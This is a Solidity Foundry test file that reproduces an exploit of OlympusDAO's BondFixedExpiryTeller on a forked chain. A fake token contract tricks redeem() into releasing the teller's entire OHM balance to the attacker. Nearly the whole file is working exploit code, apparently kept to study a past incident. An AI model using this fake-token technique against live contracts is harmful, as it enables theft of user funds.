// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IERC20} from "../../interfaces/IERC20.sol";

import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";

address constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;

interface IBondFixedExpiryTeller {
    function redeem(ExploitOlympusToken token_, uint256 amount_) external;
}

// forge test --match-contract Exploit_OlympusDao -vvv
contract Exploit_OlympusDao is TestHarness, TokenBalanceTracker {
    address internal constant BOND_FIXED_EXPIRY_TELLER = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;
    // actual attacker address: 0x443cf223e209E5A2c08114A2501D8F0f9Ec7d9Be;
    address internal ATTACKER = address(this);

    ExploitOlympusToken public exploitToken;
    IBondFixedExpiryTeller public bondExpiryTeller;

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 15_794_363); // We pin one block before the exploit
        // happened.
        cheat.label(OHM, "OHM");
        cheat.label(BOND_FIXED_EXPIRY_TELLER, "BondFixedExpiryTeller");
        cheat.label(ATTACKER, "Attacker");

        exploitToken = new ExploitOlympusToken();
        bondExpiryTeller = IBondFixedExpiryTeller(BOND_FIXED_EXPIRY_TELLER);

        addTokenToTracker(OHM);
        updateBalanceTracker(ATTACKER);
        updateBalanceTracker(BOND_FIXED_EXPIRY_TELLER);
    }

    function test_attack() public {
        uint256 initialTellerContractBalance = IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER);
        uint256 initialAttackerBalance = IERC20(OHM).balanceOf(ATTACKER);

        console.log("\nBefore Attack OHM Balance");
        logBalancesWithLabel("Teller", BOND_FIXED_EXPIRY_TELLER);
        logBalancesWithLabel("Attacker", ATTACKER);

        // We pass the exploit token that has the required properties mentioned before
        bondExpiryTeller.redeem(exploitToken, initialTellerContractBalance);

        console.log("\nAfter Attack OHM Balance");
        logBalancesWithLabel("Teller", BOND_FIXED_EXPIRY_TELLER);
        logBalancesWithLabel("Attacker", ATTACKER);

        uint256 finalAttackerBalance = IERC20(OHM).balanceOf(ATTACKER);
        assertGe(finalAttackerBalance, initialAttackerBalance);
    }
}

contract ExploitOlympusToken {
    function underlying() external pure returns (address) {
        return OHM;
    }

    function expiry() external pure returns (uint48 _expiry) {
        return 1;
    }

    function burn(address, uint256) external {} // it could do nothing as long as the burn(address,uint256)
    // selector exists.
}
